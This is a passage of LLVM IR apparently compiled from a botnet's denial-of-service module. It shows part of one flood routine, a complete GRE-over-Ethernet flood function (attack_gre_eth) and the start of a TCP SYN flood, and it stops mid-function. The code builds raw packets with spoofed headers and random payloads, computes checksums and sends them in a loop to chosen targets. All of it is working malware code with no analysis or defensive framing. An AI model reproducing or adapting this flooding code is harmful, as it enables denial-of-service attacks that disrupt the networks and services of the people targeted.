  %265 = getelementptr inbounds i8, i8* %225, i64 10
  %266 = bitcast i8* %265 to i16*
  store i16 0, i16* %266, align 2
  %267 = bitcast i8* %225 to i16*
  %268 = call zeroext i16 @checksum_generic(i16* %267, i32 20)
  store i16 %268, i16* %266, align 2
  %269 = getelementptr inbounds i8, i8* %225, i64 34
  %270 = bitcast i8* %269 to i16*
  store i16 0, i16* %270, align 2
  %271 = bitcast i8* %226 to i16*
  %272 = call zeroext i16 @checksum_generic(i16* %271, i32 20)
  store i16 %272, i16* %270, align 2
  %273 = getelementptr inbounds i8, i8* %225, i64 50
  %274 = bitcast i8* %273 to i16*
  store i16 0, i16* %274, align 2
  %275 = getelementptr inbounds i8, i8* %225, i64 48
  %276 = bitcast i8* %275 to i16*
  %277 = load i16, i16* %276, align 2
  %278 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %227, i8* nonnull %228, i16 zeroext %277, i32 %107)
  store i16 %278, i16* %274, align 2
  %279 = sext i32 %264 to i64
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %279, i32 0, i32 0
  store i16 2, i16* %280, align 4
  %281 = getelementptr inbounds i8, i8* %225, i64 16
  %282 = bitcast i8* %281 to i32*
  %283 = load i32, i32* %282, align 4
  %284 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %279, i32 0, i32 2, i32 0
  store i32 %283, i32* %284, align 4
  %285 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %279, i32 0, i32 1
  store i16 0, i16* %285, align 2
  %286 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %279, i32 0
  %287 = bitcast %struct.sockaddr_in* %286 to %struct.sockaddr*
  %288 = call i64 @sendto(i32 %32, i8* nonnull %225, i64 %.pre140, i32 16384, %struct.sockaddr* %287, i32 16) #10
  %289 = load i32, i32* %6, align 4
  %290 = add nsw i32 %289, 1
  store i32 %290, i32* %6, align 4
  %291 = icmp slt i32 %290, %38
  br i1 %291, label %.lr.ph.split, label %._crit_edge.loopexit147

._crit_edge.loopexit:                             ; preds = %194
  br label %._crit_edge

._crit_edge.loopexit147:                          ; preds = %263
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit147, %._crit_edge.loopexit, %151
  %292 = call i64 @time(i64* null) #10
  %293 = icmp sgt i64 %292, %108
  br i1 %293, label %.loopexit.loopexit, label %151

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %96
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %10 = zext i8 %1 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 8) #10
  %12 = bitcast i8* %11 to i8**
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %16 = trunc i32 %15 to i16
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %18 = trunc i32 %17 to i8
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 1)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %27 = trunc i32 %26 to i8
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 18, i32 0)
  %29 = trunc i32 %28 to i8
  %30 = load i32, i32* @LOCAL_ADDR, align 4
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %30)
  %32 = tail call i64 @time(i64* null) #10
  %33 = zext i32 %0 to i64
  %34 = add i64 %32, %33
  %35 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %.loopexit, label %37

; <label>:37:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %38 = bitcast i32* %6 to i8*
  %39 = call i32 @setsockopt(i32 %35, i32 0, i32 3, i8* nonnull %38, i32 4) #10
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %102, label %.preheader136

.preheader136:                                    ; preds = %37
  store i32 0, i32* %6, align 4
  %41 = zext i8 %1 to i32
  %42 = icmp eq i8 %1, 0
  %.pre = sext i32 %25 to i64
  %.pre145 = add nsw i64 %.pre, 66
  br i1 %42, label %.preheader, label %.lr.ph138

.lr.ph138:                                        ; preds = %.preheader136
  %43 = trunc i64 %.pre145 to i16
  %44 = icmp eq i8 %20, 0
  %45 = add nsw i64 %.pre, 28
  %46 = trunc i64 %45 to i16
  %47 = xor i16 %16, -1
  %48 = icmp eq i8 %29, 0
  %49 = add nsw i64 %.pre, 8
  %50 = trunc i64 %49 to i16
  %51 = zext i8 %1 to i64
  br i1 %44, label %.lr.ph138.split.preheader, label %.lr.ph138.split.us.preheader

.lr.ph138.split.us.preheader:                     ; preds = %.lr.ph138
  br label %.lr.ph138.split.us

.lr.ph138.split.preheader:                        ; preds = %.lr.ph138
  br label %.lr.ph138.split

.lr.ph138.split.us:                               ; preds = %.lr.ph138.split.us.preheader, %.lr.ph138.split.us
  %indvars.iv143 = phi i64 [ %indvars.iv.next144, %.lr.ph138.split.us ], [ 0, %.lr.ph138.split.us.preheader ]
  %52 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %53 = getelementptr inbounds i8*, i8** %12, i64 %indvars.iv143
  store i8* %52, i8** %53, align 8
  %54 = getelementptr inbounds i8, i8* %52, i64 38
  %55 = getelementptr inbounds i8, i8* %52, i64 58
  store i8 69, i8* %52, align 4
  %56 = getelementptr inbounds i8, i8* %52, i64 1
  store i8 %14, i8* %56, align 1
  %57 = call zeroext i16 @htons(i16 zeroext %43) #11
  %58 = getelementptr inbounds i8, i8* %52, i64 2
  %59 = bitcast i8* %58 to i16*
  store i16 %57, i16* %59, align 2
  %60 = call zeroext i16 @htons(i16 zeroext %16) #11
  %61 = getelementptr inbounds i8, i8* %52, i64 4
  %62 = bitcast i8* %61 to i16*
  store i16 %60, i16* %62, align 4
  %63 = getelementptr inbounds i8, i8* %52, i64 8
  store i8 %18, i8* %63, align 4
  %64 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %65 = getelementptr inbounds i8, i8* %52, i64 6
  %66 = bitcast i8* %65 to i16*
  store i16 %64, i16* %66, align 2
  %67 = getelementptr inbounds i8, i8* %52, i64 9
  store i8 47, i8* %67, align 1
  %68 = getelementptr inbounds i8, i8* %52, i64 12
  %69 = bitcast i8* %68 to i32*
  store i32 %31, i32* %69, align 4
  %70 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv143, i32 1
  %71 = load i32, i32* %70, align 4
  %72 = getelementptr inbounds i8, i8* %52, i64 16
  %73 = bitcast i8* %72 to i32*
  store i32 %71, i32* %73, align 4
  %74 = call zeroext i16 @htons(i16 zeroext 25944) #11
  %75 = getelementptr inbounds i8, i8* %52, i64 22
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 2
  %77 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %78 = getelementptr inbounds i8, i8* %52, i64 36
  %79 = bitcast i8* %78 to i16*
  store i16 %77, i16* %79, align 1
  store i8 69, i8* %54, align 4
  %80 = getelementptr inbounds i8, i8* %52, i64 39
  store i8 %14, i8* %80, align 1
  %81 = call zeroext i16 @htons(i16 zeroext %46) #11
  %82 = getelementptr inbounds i8, i8* %52, i64 40
  %83 = bitcast i8* %82 to i16*
  store i16 %81, i16* %83, align 2
  %84 = call zeroext i16 @htons(i16 zeroext %47) #11
  %85 = getelementptr inbounds i8, i8* %52, i64 42
  %86 = bitcast i8* %85 to i16*
  store i16 %84, i16* %86, align 4
  %87 = getelementptr inbounds i8, i8* %52, i64 46
  store i8 %18, i8* %87, align 4
  %88 = getelementptr inbounds i8, i8* %52, i64 44
  %89 = bitcast i8* %88 to i16*
  store i16 %64, i16* %89, align 2
  %90 = getelementptr inbounds i8, i8* %52, i64 47
  store i8 17, i8* %90, align 1
  %. = select i1 %48, i32 1023, i32 %71
  %91 = getelementptr inbounds i8, i8* %52, i64 54
  %92 = bitcast i8* %91 to i32*
  store i32 %., i32* %92, align 4
  %93 = call zeroext i16 @htons(i16 zeroext %22) #11
  %94 = bitcast i8* %55 to i16*
  store i16 %93, i16* %94, align 2
  %95 = call zeroext i16 @htons(i16 zeroext %24) #11
  %96 = getelementptr inbounds i8, i8* %52, i64 60
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 2
  %98 = call zeroext i16 @htons(i16 zeroext %50) #11
  %99 = getelementptr inbounds i8, i8* %52, i64 62
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 2
  %indvars.iv.next144 = add nsw i64 %indvars.iv143, 1
  %101 = icmp slt i64 %indvars.iv.next144, %51
  br i1 %101, label %.lr.ph138.split.us, label %..preheader_crit_edge.loopexit153

; <label>:102:                                    ; preds = %37
  %103 = call i32 @close(i32 %35) #10
  br label %.loopexit

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph138.split
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit153:                ; preds = %.lr.ph138.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit153, %..preheader_crit_edge.loopexit
  %.lcssa139.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next144, %..preheader_crit_edge.loopexit153 ]
  %.lcssa139 = trunc i64 %.lcssa139.in to i32
  store i32 %.lcssa139, i32* %6, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader136, %..preheader_crit_edge
  %104 = icmp eq i32 %31, -1
  %105 = and i32 %15, 65535
  %106 = icmp eq i32 %105, 65535
  %107 = and i32 %21, 65535
  %108 = icmp eq i32 %107, 65535
  %109 = and i32 %23, 65535
  %110 = icmp eq i32 %109, 65535
  %111 = icmp eq i8 %29, 0
  %112 = bitcast i32* %7 to i8*
  %113 = bitcast i32* %8 to i8*
  %114 = bitcast i32* %9 to i8*
  %115 = getelementptr inbounds i8, i8* %114, i64 2
  %116 = icmp eq i8 %27, 0
  %117 = add i32 %25, 8
  %sext = shl i64 %34, 32
  %118 = ashr exact i64 %sext, 32
  br label %164

.lr.ph138.split:                                  ; preds = %.lr.ph138.split.preheader, %.lr.ph138.split
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph138.split ], [ 0, %.lr.ph138.split.preheader ]
  %119 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %120 = getelementptr inbounds i8*, i8** %12, i64 %indvars.iv
  store i8* %119, i8** %120, align 8
  %121 = getelementptr inbounds i8, i8* %119, i64 38
  %122 = getelementptr inbounds i8, i8* %119, i64 58
  store i8 69, i8* %119, align 4
  %123 = getelementptr inbounds i8, i8* %119, i64 1
  store i8 %14, i8* %123, align 1
  %124 = call zeroext i16 @htons(i16 zeroext %43) #11
  %125 = getelementptr inbounds i8, i8* %119, i64 2
  %126 = bitcast i8* %125 to i16*
  store i16 %124, i16* %126, align 2
  %127 = call zeroext i16 @htons(i16 zeroext %16) #11
  %128 = getelementptr inbounds i8, i8* %119, i64 4
  %129 = bitcast i8* %128 to i16*
  store i16 %127, i16* %129, align 4
  %130 = getelementptr inbounds i8, i8* %119, i64 8
  store i8 %18, i8* %130, align 4
  %131 = getelementptr inbounds i8, i8* %119, i64 9
  store i8 47, i8* %131, align 1
  %132 = getelementptr inbounds i8, i8* %119, i64 12
  %133 = bitcast i8* %132 to i32*
  store i32 %31, i32* %133, align 4
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv, i32 1
  %135 = load i32, i32* %134, align 4
  %136 = getelementptr inbounds i8, i8* %119, i64 16
  %137 = bitcast i8* %136 to i32*
  store i32 %135, i32* %137, align 4
  %138 = call zeroext i16 @htons(i16 zeroext 25944) #11
  %139 = getelementptr inbounds i8, i8* %119, i64 22
  %140 = bitcast i8* %139 to i16*
  store i16 %138, i16* %140, align 2
  %141 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %142 = getelementptr inbounds i8, i8* %119, i64 36
  %143 = bitcast i8* %142 to i16*
  store i16 %141, i16* %143, align 1
  store i8 69, i8* %121, align 4
  %144 = getelementptr inbounds i8, i8* %119, i64 39
  store i8 %14, i8* %144, align 1
  %145 = call zeroext i16 @htons(i16 zeroext %46) #11
  %146 = getelementptr inbounds i8, i8* %119, i64 40
  %147 = bitcast i8* %146 to i16*
  store i16 %145, i16* %147, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %47) #11
  %149 = getelementptr inbounds i8, i8* %119, i64 42
  %150 = bitcast i8* %149 to i16*
  store i16 %148, i16* %150, align 4
  %151 = getelementptr inbounds i8, i8* %119, i64 46
  store i8 %18, i8* %151, align 4
  %152 = getelementptr inbounds i8, i8* %119, i64 47
  store i8 17, i8* %152, align 1
  %.149 = select i1 %48, i32 1023, i32 %135
  %153 = getelementptr inbounds i8, i8* %119, i64 54
  %154 = bitcast i8* %153 to i32*
  store i32 %.149, i32* %154, align 4
  %155 = call zeroext i16 @htons(i16 zeroext %22) #11
  %156 = bitcast i8* %122 to i16*
  store i16 %155, i16* %156, align 2
  %157 = call zeroext i16 @htons(i16 zeroext %24) #11
  %158 = getelementptr inbounds i8, i8* %119, i64 60
  %159 = bitcast i8* %158 to i16*
  store i16 %157, i16* %159, align 2
  %160 = call zeroext i16 @htons(i16 zeroext %50) #11
  %161 = getelementptr inbounds i8, i8* %119, i64 62
  %162 = bitcast i8* %161 to i16*
  store i16 %160, i16* %162, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %163 = icmp slt i64 %indvars.iv.next, %51
  br i1 %163, label %.lr.ph138.split, label %..preheader_crit_edge.loopexit

; <label>:164:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %42, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %164
  br i1 %104, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %211
  %storemerge135137.us = phi i32 [ %238, %211 ], [ 0, %.lr.ph.split.us.preheader ]
  %165 = sext i32 %storemerge135137.us to i64
  %166 = getelementptr inbounds i8*, i8** %12, i64 %165
  %167 = load i8*, i8** %166, align 8
  %168 = getelementptr inbounds i8, i8* %167, i64 24
  %169 = getelementptr inbounds i8, i8* %167, i64 38
  %170 = bitcast i8* %169 to %struct.iphdr*
  %171 = getelementptr inbounds i8, i8* %167, i64 58
  %172 = getelementptr inbounds i8, i8* %167, i64 66
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %165, i32 2
  %174 = load i8, i8* %173, align 4
  %175 = icmp ult i8 %174, 32
  br i1 %175, label %176, label %183

; <label>:176:                                    ; preds = %.lr.ph.split.us
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %165, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #11
  %180 = call i32 @htonl(i32 %179) #11
  %181 = getelementptr inbounds i8, i8* %167, i64 16
  %182 = bitcast i8* %181 to i32*
  store i32 %180, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %.lr.ph.split.us, %176
  %184 = getelementptr inbounds i8, i8* %167, i64 12
  %185 = bitcast i8* %184 to i32*
  store i32 0, i32* %185, align 4
  br i1 %106, label %186, label %191

; <label>:186:                                    ; preds = %183
  %187 = getelementptr inbounds i8, i8* %167, i64 4
  %188 = bitcast i8* %187 to i16*
  store i16 0, i16* %188, align 4
  %189 = getelementptr inbounds i8, i8* %167, i64 42
  %190 = bitcast i8* %189 to i16*
  store i16 999, i16* %190, align 4
  br label %191

; <label>:191:                                    ; preds = %186, %183
  br i1 %108, label %192, label %194

; <label>:192:                                    ; preds = %191
  %193 = bitcast i8* %171 to i16*
  store i16 0, i16* %193, align 2
  br label %194

; <label>:194:                                    ; preds = %192, %191
  br i1 %110, label %195, label %198

; <label>:195:                                    ; preds = %194
  %196 = getelementptr inbounds i8, i8* %167, i64 60
  %197 = bitcast i8* %196 to i16*
  store i16 0, i16* %197, align 2
  br label %198

; <label>:198:                                    ; preds = %195, %194
  br i1 %111, label %203, label %199

; <label>:199:                                    ; preds = %198
  %200 = getelementptr inbounds i8, i8* %167, i64 16
  %201 = bitcast i8* %200 to i32*
  %202 = load i32, i32* %201, align 4
  br label %203

; <label>:203:                                    ; preds = %199, %198
  %.sink3.us = phi i32 [ %202, %199 ], [ 0, %198 ]
  %204 = getelementptr inbounds i8, i8* %167, i64 54
  %205 = bitcast i8* %204 to i32*
  store i32 %.sink3.us, i32* %205, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  call void @util_memcpy(i8* nonnull %168, i8* nonnull %112, i32 4)
  %206 = getelementptr inbounds i8, i8* %167, i64 30
  call void @util_memcpy(i8* %206, i8* nonnull %113, i32 4)
  %207 = getelementptr inbounds i8, i8* %167, i64 28
  call void @util_memcpy(i8* %207, i8* nonnull %114, i32 2)
  %208 = getelementptr inbounds i8, i8* %167, i64 34
  call void @util_memcpy(i8* %208, i8* %115, i32 2)
  br i1 %116, label %211, label %209

; <label>:209:                                    ; preds = %203
  call void @rand_alphastr(i8* nonnull %172, i32 %25)
  %210 = getelementptr inbounds i8, i8* %172, i64 %.pre
  store i8 0, i8* %210, align 1
  br label %211

; <label>:211:                                    ; preds = %209, %203
  %212 = getelementptr inbounds i8, i8* %167, i64 10
  %213 = bitcast i8* %212 to i16*
  store i16 0, i16* %213, align 2
  %214 = bitcast i8* %167 to i16*
  %215 = call zeroext i16 @checksum_generic(i16* %214, i32 20)
  store i16 %215, i16* %213, align 2
  %216 = getelementptr inbounds i8, i8* %167, i64 48
  %217 = bitcast i8* %216 to i16*
  store i16 0, i16* %217, align 2
  %218 = bitcast i8* %169 to i16*
  %219 = call zeroext i16 @checksum_generic(i16* %218, i32 20)
  store i16 %219, i16* %217, align 2
  %220 = getelementptr inbounds i8, i8* %167, i64 64
  %221 = bitcast i8* %220 to i16*
  store i16 0, i16* %221, align 2
  %222 = getelementptr inbounds i8, i8* %167, i64 62
  %223 = bitcast i8* %222 to i16*
  %224 = load i16, i16* %223, align 2
  %225 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %170, i8* nonnull %171, i16 zeroext %224, i32 %117)
  store i16 %225, i16* %221, align 2
  %226 = load i32, i32* %6, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %227, i32 0, i32 0
  store i16 2, i16* %228, align 4
  %229 = getelementptr inbounds i8, i8* %167, i64 16
  %230 = bitcast i8* %229 to i32*
  %231 = load i32, i32* %230, align 4
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %227, i32 0, i32 2, i32 0
  store i32 %231, i32* %232, align 4
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %227, i32 0, i32 1
  store i16 0, i16* %233, align 2
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %227, i32 0
  %235 = bitcast %struct.sockaddr_in* %234 to %struct.sockaddr*
  %236 = call i64 @sendto(i32 %35, i8* nonnull %167, i64 %.pre145, i32 16384, %struct.sockaddr* %235, i32 16) #10
  %237 = load i32, i32* %6, align 4
  %238 = add nsw i32 %237, 1
  store i32 %238, i32* %6, align 4
  %239 = icmp slt i32 %238, %41
  br i1 %239, label %.lr.ph.split.us, label %._crit_edge.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %284
  %storemerge135137 = phi i32 [ %311, %284 ], [ 0, %.lr.ph.split.preheader ]
  %240 = sext i32 %storemerge135137 to i64
  %241 = getelementptr inbounds i8*, i8** %12, i64 %240
  %242 = load i8*, i8** %241, align 8
  %243 = getelementptr inbounds i8, i8* %242, i64 24
  %244 = getelementptr inbounds i8, i8* %242, i64 38
  %245 = bitcast i8* %244 to %struct.iphdr*
  %246 = getelementptr inbounds i8, i8* %242, i64 58
  %247 = getelementptr inbounds i8, i8* %242, i64 66
  %248 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %240, i32 2
  %249 = load i8, i8* %248, align 4
  %250 = icmp ult i8 %249, 32
  br i1 %250, label %251, label %258

; <label>:251:                                    ; preds = %.lr.ph.split
  %252 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %240, i32 1
  %253 = load i32, i32* %252, align 4
  %254 = call i32 @ntohl(i32 %253) #11
  %255 = call i32 @htonl(i32 %254) #11
  %256 = getelementptr inbounds i8, i8* %242, i64 16
  %257 = bitcast i8* %256 to i32*
  store i32 %255, i32* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %.lr.ph.split, %251
  br i1 %106, label %259, label %264

; <label>:259:                                    ; preds = %258
  %260 = getelementptr inbounds i8, i8* %242, i64 4
  %261 = bitcast i8* %260 to i16*
  store i16 0, i16* %261, align 4
  %262 = getelementptr inbounds i8, i8* %242, i64 42
  %263 = bitcast i8* %262 to i16*
  store i16 999, i16* %263, align 4
  br label %264

; <label>:264:                                    ; preds = %259, %258
  br i1 %108, label %265, label %267

; <label>:265:                                    ; preds = %264
  %266 = bitcast i8* %246 to i16*
  store i16 0, i16* %266, align 2
  br label %267

; <label>:267:                                    ; preds = %265, %264
  br i1 %110, label %268, label %271

; <label>:268:                                    ; preds = %267
  %269 = getelementptr inbounds i8, i8* %242, i64 60
  %270 = bitcast i8* %269 to i16*
  store i16 0, i16* %270, align 2
  br label %271

; <label>:271:                                    ; preds = %268, %267
  br i1 %111, label %276, label %272

; <label>:272:                                    ; preds = %271
  %273 = getelementptr inbounds i8, i8* %242, i64 16
  %274 = bitcast i8* %273 to i32*
  %275 = load i32, i32* %274, align 4
  br label %276

; <label>:276:                                    ; preds = %271, %272
  %.sink3 = phi i32 [ %275, %272 ], [ 0, %271 ]
  %277 = getelementptr inbounds i8, i8* %242, i64 54
  %278 = bitcast i8* %277 to i32*
  store i32 %.sink3, i32* %278, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  call void @util_memcpy(i8* %243, i8* nonnull %112, i32 4)
  %279 = getelementptr inbounds i8, i8* %242, i64 30
  call void @util_memcpy(i8* %279, i8* nonnull %113, i32 4)
  %280 = getelementptr inbounds i8, i8* %242, i64 28
  call void @util_memcpy(i8* %280, i8* nonnull %114, i32 2)
  %281 = getelementptr inbounds i8, i8* %242, i64 34
  call void @util_memcpy(i8* %281, i8* %115, i32 2)
  br i1 %116, label %284, label %282

; <label>:282:                                    ; preds = %276
  call void @rand_alphastr(i8* nonnull %247, i32 %25)
  %283 = getelementptr inbounds i8, i8* %247, i64 %.pre
  store i8 0, i8* %283, align 1
  br label %284

; <label>:284:                                    ; preds = %276, %282
  %285 = getelementptr inbounds i8, i8* %242, i64 10
  %286 = bitcast i8* %285 to i16*
  store i16 0, i16* %286, align 2
  %287 = bitcast i8* %242 to i16*
  %288 = call zeroext i16 @checksum_generic(i16* %287, i32 20)
  store i16 %288, i16* %286, align 2
  %289 = getelementptr inbounds i8, i8* %242, i64 48
  %290 = bitcast i8* %289 to i16*
  store i16 0, i16* %290, align 2
  %291 = bitcast i8* %244 to i16*
  %292 = call zeroext i16 @checksum_generic(i16* %291, i32 20)
  store i16 %292, i16* %290, align 2
  %293 = getelementptr inbounds i8, i8* %242, i64 64
  %294 = bitcast i8* %293 to i16*
  store i16 0, i16* %294, align 2
  %295 = getelementptr inbounds i8, i8* %242, i64 62
  %296 = bitcast i8* %295 to i16*
  %297 = load i16, i16* %296, align 2
  %298 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %245, i8* nonnull %246, i16 zeroext %297, i32 %117)
  store i16 %298, i16* %294, align 2
  %299 = load i32, i32* %6, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %300, i32 0, i32 0
  store i16 2, i16* %301, align 4
  %302 = getelementptr inbounds i8, i8* %242, i64 16
  %303 = bitcast i8* %302 to i32*
  %304 = load i32, i32* %303, align 4
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %300, i32 0, i32 2, i32 0
  store i32 %304, i32* %305, align 4
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %300, i32 0, i32 1
  store i16 0, i16* %306, align 2
  %307 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %300, i32 0
  %308 = bitcast %struct.sockaddr_in* %307 to %struct.sockaddr*
  %309 = call i64 @sendto(i32 %35, i8* nonnull %242, i64 %.pre145, i32 16384, %struct.sockaddr* %308, i32 16) #10
  %310 = load i32, i32* %6, align 4
  %311 = add nsw i32 %310, 1
  store i32 %311, i32* %6, align 4
  %312 = icmp slt i32 %311, %41
  br i1 %312, label %.lr.ph.split, label %._crit_edge.loopexit152

._crit_edge.loopexit:                             ; preds = %211
  br label %._crit_edge

._crit_edge.loopexit152:                          ; preds = %284
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit152, %._crit_edge.loopexit, %164
  %313 = call i64 @time(i64* null) #10
  %314 = icmp sgt i64 %313, %118
  br i1 %314, label %.loopexit.loopexit, label %164

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %102
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 1)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 16, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 17, i32 0)
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 10, i32 0)
  %25 = trunc i32 %24 to i8
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 11, i32 0)
  %27 = trunc i32 %26 to i16
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 12, i32 0)
  %29 = trunc i32 %28 to i16
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 13, i32 0)
  %31 = trunc i32 %30 to i16
  %32 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 14, i32 1)
  %33 = trunc i32 %32 to i16
  %34 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 15, i32 0)
  %35 = trunc i32 %34 to i16
  %36 = load i32, i32* @LOCAL_ADDR, align 4
  %37 = tail call i32 @attack_get_opt_ip(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %36)
  %38 = tail call i64 @time(i64* null) #10
  %39 = zext i32 %0 to i64
  %40 = add i64 %38, %39
  %41 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %.loopexit, label %43

; <label>:43:                                     ; preds = %5
